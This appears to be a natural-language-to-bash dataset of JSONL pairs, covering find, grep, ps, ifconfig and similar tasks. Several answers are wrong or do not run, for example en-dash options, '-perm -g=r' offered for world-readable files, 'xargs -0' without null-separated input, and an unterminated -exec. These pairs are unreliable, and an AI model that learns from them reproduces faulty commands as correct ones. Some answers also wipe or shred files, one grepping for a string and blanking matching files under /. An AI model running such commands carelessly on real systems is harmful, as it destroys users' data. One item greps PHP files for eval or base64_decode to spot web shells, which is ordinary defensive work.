{"input": "Find files named core in or below the directory /tmp and delete them. Note that this will work incorrectly if there are any filenames containing newlines, single or double quotes, or spaces", "answer": "find /tmp -name core -type f -print | xargs /bin/rm -f"}
{"input": "Find files named tecmint.txt  of owner root in the entire file system", "answer": "find / -user root -name tecmint.txt"}
{"input": "Find files newer than main.css in ~/src", "answer": "find ~/src -newer main.css"}
{"input": "Find files not matching the patterns 'Image*-70x70*' and 'Image*-100x100*' in their names under Folder1 and copy them to Folder2", "answer": "find Folder1 \\( ! -name 'Image*-70x70*' -a ! -name 'Image*-100x100*' \\) | xargs -i% cp -p % Folder2"}
{"input": "Find files not matching the posix extended regex '.+\\-[0-9]{2,4}x[0-9]{2,4}\\.jpg' in their paths under Folder1 and copy them to Folder2", "answer": "find Folder1 -type f -regextype posix-extended \\( ! -regex '.+\\-[0-9]{2,4}x[0-9]{2,4}\\.jpg' \\) -print0 |  xargs -0 cp -p --target-directory=Folder2"}
{"input": "Find files on the system accessed during the last 24 hours but not within the last hour", "answer": "find / -atime -1 -amin +60"}
{"input": "Find files on the system bigger than 50MB but smaller than 100MB", "answer": "find / -type f -size +50M -size -100M"}
{"input": "Find files on the system created during the last 50 days", "answer": "find / -ctime -50"}
{"input": "Find files on the system that are bigger than 20 megabytes", "answer": "find / -type f -size +20M -exec ls -lh {} \\; | awk '{ print $NF \": \" $5 }'"}
{"input": "Find files on the system whose names begin with either x or X", "answer": "find / -name \"[Xx]*\""}
{"input": "Find files owned by no group", "answer": "find / -nogroup"}
{"input": "Find files owned by nonexistent groups", "answer": "find / -nogroup -print"}
{"input": "Find files owned by nonexistent users", "answer": "find / -nouser -print"}
{"input": "Find files patching \"pattern\"", "answer": "find . -name \"pattern\" -print"}
{"input": "Find files readable only by the group", "answer": "find . -perm g=r -type f -exec ls -l {} \\;"}
{"input": "Find files smaller than 40 blocks skipping directories on other file systems", "answer": "find . -size -40 -xdev -print"}
{"input": "Find files that are 0 bytes in size in the current directory and remove them", "answer": "find . -maxdepth 1 -size 0c -exec rm {} \\;"}
{"input": "Find files that are 0 bytes in size in the current directory tree and remove them", "answer": "find . -size 0 -exec rm {} \\;"}
{"input": "Find files that are orphaned", "answer": "find -nouser"}
{"input": "Find files that do not have a listing in the /etc/passwd or /etc/group in the file system", "answer": "find / -nouser -o  -nogroup"}
{"input": "Find files that end in \".gz\" and execute \"awk -F, '$1 ~ /F$/'\" on their unzipped contents", "answer": "find . -maxdepth 1 -name \\*.gz -print0 | xargs -0 zcat | awk -F, '$1 ~ /F$/'"}
{"input": "Find files that have been modified within the last month and copy them somewhere", "answer": "find /etc/ -mtime -30 | xargs -0 cp /a/path"}
{"input": "Find files that match the executable bit for owner or group", "answer": "find -type f -perm /110"}
{"input": "Find files that were accessed in less than a day ago", "answer": "find / -atime -1"}
{"input": "Find files that were modified 7 days ago and archive them", "answer": "find . -type f -mtime 7 | xargs tar -cvf `date '+%d%m%Y'_archive.tar`"}
{"input": "Find files that were modified in less than 1 minute ago", "answer": "find / -mmin -1"}
{"input": "Find files that were modified less than 7 days ago and archive them", "answer": "find . -type f -mtime -7 | xargs tar -cvf `date '+%d%m%Y'_archive.tar`"}
{"input": "Find files that were modified more than 7 days ago and archive them", "answer": "find . -type f -mtime +7 | xargs tar -cvf `date '+%d%m%Y'_archive.tar`"}
{"input": "Find files that were modified more than 7 days ago but less than 14 days ago and archive them", "answer": "find . -type f -mtime +7 -mtime -14 | xargs tar -cvf `date '+%d%m%Y'_archive.tar`"}
{"input": "Find files that were modified second last week and archive them", "answer": "find . -type f -mtime +7 -mtime -14 | xargs tar -cvf `date '+%d%m%Y'_archive.tar`"}
{"input": "Find files under /some/path that are not executable", "answer": "find /some/path -type f ! -perm -111 -ls"}
{"input": "Find files under /some/path that are not executable by the owner", "answer": "find /some/path -type f ! -perm -100 -ls"}
{"input": "Find files under /usr that are newer than the first file `FirstFile'", "answer": "find /usr -newer /usr/FirstFile -print"}
{"input": "Find files under /usr that are the same age or older than file `FirstFile'", "answer": "find /usr ! -newer /FirstFile -print"}
{"input": "Find files under [directory] that match 'pattern_to_INCLUDE' in their names without descending into directories that match 'pattern_to_exclude' and 'another_pattern_to_exclude', then search for 'pattern' in those files", "answer": "find [directory] -name \"pattern_to_exclude\" -prune -o -name \"another_pattern_to_exclude\" -prune -o -name \"pattern_to_INCLUDE\" -print0 | xargs -0 -I FILENAME grep -IR \"pattern\" FILENAME"}
{"input": "Find files under current directory that are not newer than $date_time in regards of modification time", "answer": "find . -type f -not -newermt \"$date_time\""}
{"input": "Find files under current directory that contains the string '/bin/ksh'", "answer": "find . -type f -exec grep -iH '/bin/ksh' {} \\;"}
{"input": "Find files under current directory without descending into other file systems and append a null character at the end of each paths", "answer": "find -x . -type f -print0"}
{"input": "Find files using file-name", "answer": "find -iname \"MyCProgram.c\""}
{"input": "Find files which are more than 2 days old under  ${userdir}/${i}/incoming directory", "answer": "find ${userdir}/${i}/incoming -mtime +2 -type f -ls"}
{"input": "Find files which are more than 2 days old under  ${userdir}/${i}/incoming directory and remove them", "answer": "find ${userdir}/${i}/incoming -mtime +2 -type f -exec rm {} \\;"}
{"input": "Find files whose content was modified at least 1 minute ago", "answer": "find ./ -mmin +1"}
{"input": "Find files whose data was modified within the given days of the month", "answer": "find ./ -daystart -mtime -10 -and -mtime +1"}
{"input": "Find files whose names match the pattern given by the 2nd argument $2 of the Bash script and replace string $3 with $4 in them", "answer": "find ./ -type f -name \"$2\" -exec sed -i \"s/$3/$4/g\" {} \\;"}
{"input": "Find files whose pathnames contain \"string\" and print these pathnames replacing 'search string' with 'new string'", "answer": "find . |xargs grep search string | sed 's/search string/new string/g'"}
{"input": "Find files whose pathnames end in \"config\"", "answer": "find .  -path '*/*config'"}
{"input": "Find files with 002 permission in entire file system", "answer": "find / -type f -perm -002"}
{"input": "Find files with 002 permission in entire file system and print them with the string 'has world write permissions' appended after every path", "answer": "find / -type f -perm -002 -printf '%p has world write permissions\\n'"}
{"input": "Find files with 002 permission in entire file system and print them with the string 'has world write permissions' printed at last", "answer": "echo $(find / -type f -perm -002) has world write permissions"}
{"input": "Find files with 002 permission in entire file system with the null character as the delimiter", "answer": "find / -type f -perm -002 -print0"}
{"input": "Find files with 002 permission under /tmp and print them with the string 'Found world write permissions:' printed as the first line of output", "answer": "find /tmp -type f -perm -002 | sed '1s/^/Found world write permissions:\\n/'"}
{"input": "Find files with 002 permission under /tmp and print them with the string 'Found world write permissions:' printed as the first line of output or print 'No world writable found' if no such files were found", "answer": "find /tmp -type f -perm -002 | awk -- '1{print \"Found world write permissions:\";print};END{if(NR==0)print \"No world writable found.\"}'"}
{"input": "Find files with SGID (2000) and SUID(4000) permssions set in the file system", "answer": "find /  \\( -perm -2000 -o -perm -4000 \\) -ls"}
{"input": "Find files with group write permission and remove the permission", "answer": "find . -perm -20 -exec chmod g-w {} ;"}
{"input": "Find files with size more than 200557600B and which are more than 2 days old under  ${userdir}/${i}/incoming directory", "answer": "find ${userdir}/${i}/incoming -mtime +2 -type f -size +200557600c -ls"}
{"input": "Find files with size more than 200557600B and which are more than 2 days old under  ${userdir}/${i}/incoming directory and remove them", "answer": "find ${userdir}/${i}/incoming -mtime +2 -type f -size +200557600c -exec rm {} \\;"}
{"input": "Find files with the extension .conf in the /etc directory", "answer": "find /etc -name '*.conf'"}
{"input": "Find files/directories containing 'test' in their names and display the directory contents before the directories themselves", "answer": "find -name \"*test*\" -depth"}
{"input": "Find files/directories in entire file system that have been modified in the last minute", "answer": "find / -mmin -1"}
{"input": "Find files/directories in entire file system that were accessed in less than a day ago", "answer": "find / -atime -1"}
{"input": "Find files/directories in entire file system that were modified a day ago", "answer": "find / -mtime 1"}
{"input": "Find files/directories named 'TEST_3' under current directory tree", "answer": "find -name TEST_3"}
{"input": "Find files/directories named 'document' in 'ext2' partitions in entire filesystem", "answer": "find / -fstype ext2 -name document -print"}
{"input": "Find files/directories named 'document' in the entire filesystem and in the directory tree '/usr' even if it's in a different partition without traversing to other devices/partitions", "answer": "find / /usr -xdev -name document -print"}
{"input": "Find files/directories named 'file.txt' in the path '/usr/lib/important/'", "answer": "find / -path /usr/lib/important/*/file.txt"}
{"input": "Find files/directories named 'file.txt' that belong to user 'tutonics' in the entire filesystem", "answer": "find / -user tutonics -name \"file.txt\""}
{"input": "Find files/directories named 'filename' in the entire filesystem", "answer": "find / -name filename -print"}
{"input": "Find files/directories named 'foo' in the current partition of the root filesystem", "answer": "find -x / -name foo"}
{"input": "Find files/directories named 'foo' under current directory tree without descending into directories named 'foo'", "answer": "find . -name foo -type d -prune -o -name foo -print"}
{"input": "Find files/directories named 'foo.bar' in the root filesystem partition", "answer": "find / -name foo.bar -print -xdev"}
{"input": "Find files/directories named 'foo.bar' under './dir1' and './dir2' directory tree", "answer": "find ./dir1 ./dir2 -name foo.bar -print"}
{"input": "Find files/directories named 'photo.jpg' in the entire filesystem", "answer": "find / -name photo.jpg"}
{"input": "Find files/directories named 'sar' under directory trees whose path starts with '/u' or '/b' or '/s' or '/o'", "answer": "find `ls -d /[ubso]*` -name sar"}
{"input": "Find files/directories named 'somename.txt' under current directory tree", "answer": "find ./ -name \"somename.txt\""}
{"input": "Find files/directories named blah (case insensitive) under current directory", "answer": "find ./ -iname blah"}
{"input": "Find files/directories named blah under current directory", "answer": "find ./ -name blah"}
{"input": "Find files/directories named<filetype> under current directory which were accessed less than 5 days ago", "answer": "find -name \"<filetype>\" -atime -5"}
{"input": "Find files/directories not changed in two weeks under /dev/shm", "answer": "find /dev/shm /tmp -type f -ctime +14"}
{"input": "Find files/directories that are owned by the user 'syslog' in entire filesystem", "answer": "find / -user syslog"}
{"input": "Find files/directories that does not have write permssion for group", "answer": "find /path ! -perm /020"}
{"input": "Find files/directories that does not have write permssion for group and others", "answer": "find /path ! -perm /022"}
{"input": "Find files/directories that does not have write permssion for group or others", "answer": "find /path ! -perm -022"}
{"input": "Find files/directories that have no owner or group under /path", "answer": "find /path -nouser -or -nogroup"}
{"input": "Find files/directories that have not been modified in the last one day in directories or files taken from the glob pattern '/tmp/test/*'", "answer": "find /tmp/test/* -daystart -mtime +1"}
{"input": "Find files/directories that is under group 'root' or have no group and set their group to 'apache'", "answer": "find /var/www -group root -o -nogroup -print0 | xargs -0 chown :apache"}
{"input": "Find files/directories that isn't owned by the user 'apache' under /var/www", "answer": "find /var/www ! -user apache -print0 | xargs -0"}
{"input": "Find files/directories under '/dir' directory tree that are newer than 'yesterday.ref' file and older than 'today.ref' file by modification time", "answer": "find /dir -newer yesterday.ref -a \\! -newer today.ref -print"}
{"input": "Find files/directories under /tmp smaller than 100 bytes", "answer": "find /tmp -size -100c"}
{"input": "Find files/directories under /users/tom that matches both the pattern \"*.pl\" and  \"*.pm\"", "answer": "find /users/tom -name \"*.pl\" -name \"*.pm\""}
{"input": "Find files/directories under current directory and force xargs to print them one by one", "answer": "find . | xargs -n 1 echo"}
{"input": "Find files/directories under current directory and print them", "answer": "find . -print0 | xargs    -0 echo"}
{"input": "Find files/directories under current directory and print them as null terminated strings", "answer": "find -print0"}
{"input": "Find files/directories under current directory that are modified exactly one hour ago", "answer": "find . -mtime 1"}
{"input": "Find files/directories under current directory that matches './projects/insanewebproject' in their paths", "answer": "find -ipath './projects/insanewebproject'"}
{"input": "Find files/directories under current directory that matches './projects/insanewebproject' in their paths and show the first one", "answer": "find -ipath './projects/insanewebproject'| head -n1"}
{"input": "Find files/directories under current directory that matches 'projects/insanewebproject' in their paths", "answer": "find -ipath 'projects/insanewebproject'"}
{"input": "Find files/directories under current directory that matches the regex /path/to/something[^/]*$  in their paths", "answer": "find . | grep -qi /path/to/something[^/]*$"}
{"input": "Find files/directories under current directory without descending into it", "answer": "find -maxdepth 0"}
{"input": "Find files/directories with inode number '212042' under '/var' directory tree without traversing other devices/partitions", "answer": "find -x /var -inum 212042"}
{"input": "Find files/directories writable by group and others under the /path directory", "answer": "find /path -perm -022"}
{"input": "Find files/directories writable by group or others under the /path directory", "answer": "find /path -perm /g+w,o+w"}
{"input": "Find find symlinks pointing to /mnt/oldname* in the entire file system", "answer": "find / -type l -lname '/mnt/oldname*'"}
{"input": "Find grub.conf files in entire file system", "answer": "find / -name grub.conf"}
{"input": "Find how many directories are in a path (counts current directory)", "answer": "find . -type d -exec basename {} \\; | wc -l"}
{"input": "Find how many files are in a path", "answer": "find . -type f -exec basename {} \\; | wc -l"}
{"input": "Find image files and move them to the pictures directory", "answer": "find ~/Desktop -name '*.jpg' -o -name '*.gif' -o -name '*.png' -print0 | xargs -0 mv \u2013target-directory ~/Pictures"}
{"input": "Find in the current direcoty whose suffix is .tmp , find will not serach recursively limit of find is 2 subdirectory ", "answer": "find .  -maxdepth 2 -name '*.tmp'"}
{"input": "Find largest file in linux with find command", "answer": "find . -type f -printf \"%s\\t%p\\n\" | sort -n | tail -1"}
{"input": "Find links to any file that happens to be named `foo.txt'", "answer": "find . -lname \\*foo.txt"}
{"input": "Find links to file path/to/foo.txt", "answer": "find -L / -samefile path/to/foo.txt"}
{"input": "Find movies over a gigabyte in size", "answer": "find ~/Movies/ -size +1024M"}
{"input": "Find mysong.ogg anywhere under the home directory", "answer": "find $HOME -name 'mysong.ogg'"}
{"input": "Find not-executable files under /home/www", "answer": "find /home/www/ ! -executable"}
{"input": "Find one file or directory in the current directory whose name matches the pattern given as a variable $a", "answer": "find . -maxdepth 1 -name \"$a\" -print -quit"}
{"input": "Find only files under /etc with the size of 100k-150k", "answer": "find /etc -size +100k -size -150k"}
{"input": "Find only number of hard link & name of files from long list", "answer": "find -type f -iname \"*.txt\" -exec ls -lrt {} \\;|awk -F' ' '{print $1 $2  $9}'"}
{"input": "Find only permission field & file name from long listing with find command ", "answer": "find -type f -iname \"*.txt\" -exec ls -lrt {} \\;|awk -F' ' '{print $1  $9}'"}
{"input": "Find out all *.sh owned by user vivek", "answer": "find / -user vivek -name \"*.sh\""}
{"input": "Find out all files owned by user vivek", "answer": "find / -user vivek"}
{"input": "Find out all hard links in the /home directory to file1", "answer": "find /home -xdev -samefile file1"}
{"input": "Find out if there are any files on the system owned by user `account'", "answer": "find / -path /proc -prune -o -user account -ls"}
{"input": "Find recursively all Emacs backup files in the current directory and remove them", "answer": "find . -name '*~' | xargs rm"}
{"input": "Find recursively all Python files in the current directory and search them for the word 'import'", "answer": "find . -name '*.py' | xargs grep 'import'"}
{"input": "Find recursively all files in /path that end in \"txt\" and copy them to /tmp/", "answer": "find /path -type f -name \"*txt\" -printf \"cp '%p' '/tmp/test_%f'\\n\" | bash"}
{"input": "Find recursively all files in the \".\" directory tree whose names end with \".class\" and delete them", "answer": "find . -type f -name \"*.class\" -exec rm -vf {} \\;"}
{"input": "Find recursively all files whose names ends with \"foo\"", "answer": "find . -name \"*foo\""}
{"input": "Find recursively all regular .txt files in the current directory tree except README.txt", "answer": "find . -type f -name \"*.txt\" ! -name README.txt -print"}
{"input": "Find recursively all regular files in directory tree b that were changed within the last 5 minutes and copy them to directory c", "answer": "find b -type f -cmin -5 -exec cp '{}' c \\;"}
{"input": "Find recursively all regular files in the current directory skipping hidden files and directories matching pattern '.?*'", "answer": "find -name '.?*' -prune -o \\( -type f -print0 \\)"}
{"input": "Find recursively all regular files in the current directory tree not ending in .dll or .exe", "answer": "find . -type f | grep -vP \"\\.dll$|\\.exe$\""}
{"input": "Find recursively all regular files in the current directory whose names contain \".\"", "answer": "find . -type f -a -name '*.*'"}
{"input": "Find recursively regular files in the directory given as the script's command line argument #1, skipping hidden files and directories", "answer": "find \"$1\" -path \"*/.*\" -prune -o \\( -type f -print0 \\)"}
{"input": "Find recursively the files named \"file\" in the current directory ignoring all .git directories", "answer": "find . -name .git  -prune -o -name file  -print"}
{"input": "Find recursively the latest modified .zip file in the current directory", "answer": "find . -name \"*zip\" -type f | xargs ls -ltr | tail -1"}
{"input": "Find recursively the latest modified file in the current directory", "answer": "find . -type f -print0|xargs -0 ls -drt|tail -n 1"}
{"input": "Find regular files in the current directory that are writable by at least somebody", "answer": "find -maxdepth 1 -type f -perm /222"}
{"input": "Find regular files in the current directory that are writable by their owner", "answer": "find -maxdepth 1 -type f -perm /200"}
{"input": "Find regular files in the current directory tree that are called FindCommandExamples.txt and remove them", "answer": "find . -type f -name \"FindCommandExamples.txt\" -exec rm -f {} \\;"}
{"input": "Find regular files in the current directory tree that have all executable bits set", "answer": "find -L . -type f -perm -a=x"}
{"input": "Find regular files in the current directory tree that have any executable bits set", "answer": "find -L . -type f \\( -perm -u=x -o -perm -g=x -o -perm -o=x \\)"}
{"input": "Find regular files in the current directory tree that have executable bits set for the user and group but not for the other", "answer": "find -L . -type f -perm -u=x,g=x  \\! -perm -o=x"}
{"input": "Find regular files named \"expression -and expression\" under and below /dir/to/search/", "answer": "find /dir/to/search/ -type f -name 'expression -and expression' -print"}
{"input": "Find regular files named \"expression -or expression\" under and below /dir/to/search/", "answer": "find /dir/to/search/ -type f -name 'expression -or expression' -print"}
{"input": "Find regular files named 'findme.txt' under '/usr' and '/home' directory tree", "answer": "find /usr /home -name findme.txt -type f -print"}
{"input": "Find regular files named core under /tmp and delete them", "answer": "find /tmp -name core -type f -print | xargs /bin/rm -f"}
{"input": "Find regular files readable by the world", "answer": "find . -perm -g=r -type f -exec ls -l {} \\;"}
{"input": "Find regular files that have SUID or SGID set", "answer": "find / -perm +6000 -type f"}
{"input": "Find regular files under '/somefolder' directory tree satisfying the options/conditions/operations provided in ${ARGS[@]} array with find command", "answer": "find /somefolder -type f '(' \"${ARGS[@]}\" ')'"}
{"input": "Find regular files under / that contain \"stringtofind\"", "answer": "find / -maxdepth 1 -xdev -type f  -exec grep -li stringtofind '{}' \\;"}
{"input": "Find regular files under / that contain \"stringtofind\" and clear out their contents", "answer": "find / -maxdepth 1 -xdev -type f -exec grep -i \"stringtofind\" -l {} \\; -exec sed -i '/./d' {} \\;"}
{"input": "Find regular files with permissions less than 111", "answer": "find -perm -111 -type f"}
{"input": "Find regular non-hidden files containing 'some text' in their names", "answer": "find . -not -path '*/\\.*' -type f -name '*some text*'"}
{"input": "Find regular non-hidden files containing `some text' in their names with hidden directories optimization", "answer": "find . -type d -path '*/\\.*' -prune -o -not -name '.*' -type f -name '*some text*' -print"}
{"input": "Find root's Ruby files accessed in the last two minutes", "answer": "find /apps/ -user root -type f -amin -2 -name *.rb"}
{"input": "Find root's files in the current directory tree", "answer": "find ./ -user root"}
{"input": "Find smallest file in the current directory with find commad", "answer": "find . -type f -printf \"%s\\t%p\\n\" | sort -n |head -1"}
{"input": "Find string \"STRING\" in files residing in the current directory tree, case insensitive", "answer": "find . -type f -print | xargs grep -ni \"STRING\""}
{"input": "Find strings with 'Features' in /var/run/dmesg.boot' file", "answer": "cat /var/run/dmesg.boot | grep Features"}
{"input": "Find suspicious PHP files", "answer": "find . -type f -name \"*.php\" -exec grep --with-filename \"eval(\\|exec(\\|base64_decode(\" {} \\;"}
{"input": "Find symbolic links in /usr/lib and /usr/lib64 to files whose pathnames contain \"libstdc++\"", "answer": "find  /usr/lib/ /usr/lib64/ -lname \"*libstdc++*\""}
{"input": "Find symbolic links in /usr/sbin and /usr/bin to files whose pathnames end in \"*/systemctl\"", "answer": "find /usr/sbin /usr/bin -lname \"*/systemctl\""}
{"input": "Find symbolic links in lpi104-6 and research/lpi104-6 to files whose pathnames end in \"file1\"", "answer": "find lpi104-6 research/lpi104-6 -lname \"*file1\""}
{"input": "Find symbolic links under /etc/", "answer": "find /etc -type l"}
{"input": "Find symlinks under and below the \"test\" directory and replace them with the content of the linked files", "answer": "find test -type l -exec cp {} {}.tmp$$ \\; -exec mv {}.tmp$$ {} \\;"}
{"input": "Find text files modified less than 5 days ago", "answer": "find . \u2013name \"*.txt\" \u2013mtime 5"}
{"input": "Find text in whole directory tree", "answer": "find . -type f | xargs grep \"text\""}
{"input": "Find the \"*.foo\" files in the current directory tree that are not under \".snapshot\" directories", "answer": "find . -name .snapshot -prune -o -name '*.foo' -print"}
{"input": "Find the \"erl\" executable in $PATH and read the \"RELEASES\" file to extract the erlang release number", "answer": "awk -F, 'NR==1 {gsub(/\"/,\"\",$3);print $3}' \"$(dirname $(readlink -f $(which erl)))/../releases/RELEASES\""}
{"input": "Find the \"param1\" string in regular files under and below /var", "answer": "find /var  -type f -exec grep \"param1\" {} \\; -print"}
{"input": "Find the .groovy files outside the \"./target\" directory path", "answer": "find .  -name \"*.groovy\" -not -path \"./target/*\" -print"}
{"input": "Find the core files and  remove them", "answer": "find . -name 'core' -exec rm -f {} \\;"}
{"input": "Find the directories whose names contain \"New Parts\" at level 3 of the current directory tree and create symlinks to them in /cygdrive/c/Views", "answer": "find -mindepth 3 -maxdepth 3 -type d -name \"*New Parts*\" -exec ln -s -t /cygdrive/c/Views {} \\;"}
{"input": "Find the directories whose pathnames contain \"New Parts\" at level 3 of the current directory tree and create symlinks to them in /cygdrive/c/Views", "answer": "find -mindepth 3 -maxdepth 3 -type d | grep \"New Parts\" | tr '\\012' '\\000' | xargs -0 ln -s -t /cygdrive/c/Views"}
{"input": "Find the directory with least modification time under current directory", "answer": "find -type d -printf '%T+ %p\\n' | sort | head -1"}
{"input": "Find the file in the current directory tree with inode number $inum and delete it", "answer": "find . -inum $inum -exec rm {} \\;"}
{"input": "Find the file whose inode number is 1316256", "answer": "find . -inum 1316256"}
{"input": "Find the files in the current directory that match pattern '*.ISOLATE.*.txt' and move them to folder ./ISOLATE", "answer": "find . -name '*.ISOLATE.*.txt' -maxdepth 1 -print0 | xargs -0 -IFILE mv FILE ./ISOLATE"}
{"input": "Find the files in the current directory that match pattern '*.ISOLATE.quantifier.txt' and move them to folder ISOLATE/", "answer": "find -name '*.ISOLATE.quantifier.txt' -maxdepth 1 -exec mv {} ISOLATE/ +"}
{"input": "Find the files in the current directory that match pattern '*.JUKEBOX.*.txt' and move them to folder ./JUKEBOX", "answer": "find . -name '*.JUKEBOX.*.txt' -maxdepth 1 -print0 | xargs -0 -IFILE mv FILE ./JUKEBOX"}
{"input": "Find the first file/directory in ... directory and quit", "answer": "find ... -print -quit"}
{"input": "Find the first file/directory under current directory and quit", "answer": "find . ... -print -quit"}
{"input": "Find the most recently changed files in a subtree", "answer": "find . -type f -printf '%TY-%Tm-%Td %TT   %p\\n' | sort"}
{"input": "Find the passwd file in the current directory and one level down", "answer": "find -maxdepth 2 -name passwd"}
{"input": "Find the passwd file under root and one level down", "answer": "find -maxdepth 2 -name passwd"}
{"input": "Find the passwd file under root and two levels down", "answer": "find / -maxdepth 3 -name passwd"}
{"input": "Find the password file between sub-directory level 2 and 4", "answer": "find -mindepth 3 -maxdepth 5 -name passwd"}
{"input": "Find the password file between sub-directory level 2 and 4", "answer": "find -mindepth 3 -maxdepth 5 -name passw"}
{"input": "Find the process id of mysql", "answer": "ps -A|grep mysql"}
{"input": "Find the top 25 files according to their size in the current directory and its subdirectories", "answer": "find . -type f -exec ls -al {} \\; | sort -nr -k5 | head -n 25"}
{"input": "Find the total size of *.jpg files within the current directory tree", "answer": "find . -type f -iname '*.jpg' -print0 | du -c --files0-from=-"}
{"input": "Find the total size of *.jpg files within the directory tree ./photos/john_doe", "answer": "find ./photos/john_doe -type f -name '*.jpg' -exec du -ch {} + | grep total$"}
{"input": "Find the unique owners of all the files in the /bin directory", "answer": "find /bin -type f -follow | xargs    ls -al | awk ' NF==9 { print $3 }'|sort -u"}
{"input": "Find things changed today", "answer": "find /path/to/search -daystart -ctime -1"}
{"input": "Find user daniel's files of type jpeg", "answer": "find . -user daniel -type f -name *.jpg"}
{"input": "Find user daniel's files of type jpeg without `autumn' in the name", "answer": "find . -user daniel -type f -name *.jpg ! -name autumn*"}
{"input": "Find users whose names begin with \"ab\" and ends with \"1\"", "answer": "who | cut -d ' ' -f 1 | grep -e '^ab' -e '1$'"}
{"input": "Find users whose names begin with \"ab\" or whose terminal from which they are logged in ends with \"1\"", "answer": "who | grep -e '^ab' -e '1$'"}
{"input": "Find which ruby files under current directory contain the string 'jump'", "answer": "find . -name '*.rb' -exec grep -H jump {} \\;"}
{"input": "Find writable regular files in the current directory", "answer": "find -type f -maxdepth 1 -writable"}
{"input": "Find writable regular files omitting those that contain sites/default/files in their names", "answer": "find . -type f -writable | grep -v sites/default/files"}
{"input": "Find x* files/directories under /tmp directory whose status was changed less than 1 day ago", "answer": "find /tmp/ -ctime -1 -name x*"}
{"input": "Find x* files/directories under /tmp directory whose status was changed less than 1 day ago and move them to ~/play", "answer": "find /tmp/ -ctime -1 -name \"x*\" -exec mv '{}' ~/play/"}
{"input": "Finds $a pattern in a $b string, and returns exit code 0 if found, suppressing any visible output", "answer": "echo $b|grep -q $a"}
{"input": "Finds IP address of 'en0' network interface", "answer": "ifconfig en0 | grep inet | grep -v inet6 | awk '{print $2}'"}
{"input": "Finds IP address of 'eth0' network interface", "answer": "ifconfig eth0 | grep 'inet addr:' | awk '{print $2}' | awk -F ':' '{print $2}'"}
{"input": "Finds IP address of system network interface, that belongs to 192.168.111 subnet", "answer": "ifconfig | grep 192.168.111 | awk '{print $2}'"}
{"input": "Finds IP addresses of all network interfaces", "answer": "ifconfig | grep -v '127.0.0.1' | sed -n 's/.*inet addr:\\([0-9.]\\+\\)\\s.*/\\1/p'"}
{"input": "Finds PIDs of all running processes, gets executable binary of each process, and prints containing folder of each binary", "answer": "ps -A -o pid | xargs -I pid readlink \"/proc/pid/exe\" | xargs -I file dirname \"file\""}
{"input": "Finds all files having text \"texthere\" recursively in a current folder, and precedes found string with string number in file and file name", "answer": "find -type f -exec grep -Hn \"texthere\" {} +"}
{"input": "Finds all files in $LOCATION, prints file names, overwrite files with random content $TIMES times, and finally remove them", "answer": "find $LOCATION -print -exec shred $TIMES -u '{}' \\;"}
{"input": "Finds all files like \"mylog*.log\" newer than $2 and archives them with bzip2", "answer": "find . -type f -ctime -$2 -name \"mylog*.log\" | xargs bzip2"}
{"input": "Finds all folders that contain 'ssh' file and have 'bin' in path", "answer": "dirname `find / -name ssh | grep bin`"}
{"input": "Finds all php processes running in system", "answer": "pstree | grep php"}
{"input": "Finds all the log* files in /myDir recursively that are more than 7 days older, skipping already created .bz2 archives and compresses them", "answer": "find /myDir -name 'log*' -and -not -name '*.bz2' -ctime +7 -exec bzip2 -zv {} \\;"}
{"input": "Finds all the log* files recursively in /myDir that are more than 7 days older and compresses them", "answer": "find /myDir -name \"log*\" -ctime +7 -exec bzip2 -zv {} \\;"}
{"input": "Finds all user session in system, and shows sorted user names with number of sessions of each user", "answer": "w | sed '1,2d' | cut -f1 -d' ' | sort | uniq -c"}
{"input": "Finds all users logged in via ssh", "answer": "w | grep ssh"}
{"input": "Finds every folder with file 'header.php' within, and copies file 'topscripts.php' to every one of them", "answer": "find -type f -name 'header.php' | xargs -n 1 dirname | xargs -n 1 cp -f topscripts.php"}
{"input": "Finds file 'Subscription.java' and changes to containing folder", "answer": "cd $(find . -name Subscription.java | xargs dirname)"}
{"input": "Finds files in 'directory' folder with the same name and location but different content than files in 'directory.original' folder and prints location of such files", "answer": "diff -qr directory directory.original | cut -d' ' -f2 | xargs dirname | uniq"}
{"input": "Finds files in 'directory' folder with the same name and location but different content than files in 'directory.original' folder and saves location of such files to 'directories' variable", "answer": "directories=$(diff -qr directory directory.original | cut -d' ' -f2 | xargs dirname | uniq)"}
{"input": "Finds if environment variable like 'DUALCASE' exists in environment", "answer": "env | grep DUALCASE"}
{"input": "Finds matched text in defined path recursively, but not follows symlinks", "answer": "grep -r \"string to be searched\"  /path/to/dir"}
{"input": "Finds more than 5 days old files in two directories  and compresses them", "answer": "find /home/folder1 /home/folder2 -type f -mtime +5 -exec compress {} \\;"}
{"input": "Finds only parts of echoed string that match with regex 'run-parts (-{1,2}\\S+ )*\\S+', and saves them in $match variable, each matched part on a separate line", "answer": "match=$(echo \"${line}\" | egrep -o 'run-parts (-{1,2}\\S+ )*\\S+')"}
{"input": "Finds pattern text ignoring letter case in all .js files, prints matched strings and name of file with that strings", "answer": "find . -name '*.js' -exec grep -i 'string to search for' {} \\; -print"}
{"input": "Finds recursion-related options of a 'grep' utility", "answer": "grep --help |grep recursive"}
{"input": "Finds recursively all files having extension .c, .h in '/path/' that contain 'pattern', and prints matched strings with string number and file name", "answer": "grep --include=\\*.{c,h} -rnw '/path/to/somewhere/' -e \"pattern\""}
{"input": "Finds recursively all files in '/path/' excluding folders dir1, dir2 and all like *.dst, that contain 'pattern', and prints matched strings with string number and file name", "answer": "grep --exclude-dir={dir1,dir2,*.dst} -rnw '/path/to/somewhere/' -e \"pattern\""}
{"input": "Finds recursively all files not having extension .o in '/path/' that contain 'pattern', and prints matched strings with string number and file name", "answer": "grep --exclude=*.o -rnw '/path/to/somewhere/' -e \"pattern\""}
{"input": "Finds recursively all folders in current folder which path not contains \"NameToExclude\" string and removes only ones without files and another folders within", "answer": "find . -type 'd' | grep -v \"NameToExclude\" | xargs rmdir"}
{"input": "Finds recursively all folders named 'a' within current folder and removes only ones without files and another folders within", "answer": "find -type d -name a -exec rmdir {} \\;"}
{"input": "Finds recursively and following symlinks from root folder all files that contain \"text-to-find-here\" and prints files names", "answer": "grep -Ril \"text-to-find-here\" /"}
{"input": "Finds shell options like 'checkjobs' with their state", "answer": "shopt -p | grep checkjobs"}
{"input": "Finds shell options with 'login' in name", "answer": "shopt | grep login"}
{"input": "Finds string with text \"string to be searched\" in any cased files like \"*.cs\" recursively in a current folder", "answer": "find ./ -type f -iname \"*.cs\" -print0 | xargs -0 grep \"content pattern\""}
{"input": "Finds strings having text \"searched-string\" in all files recursively in a current folder", "answer": "find . | xargs grep \"searched-string\""}
{"input": "Finds strings like \"texthere\" recursively in all files of a current folder regarding all symlinks", "answer": "grep -R \"texthere\" *"}
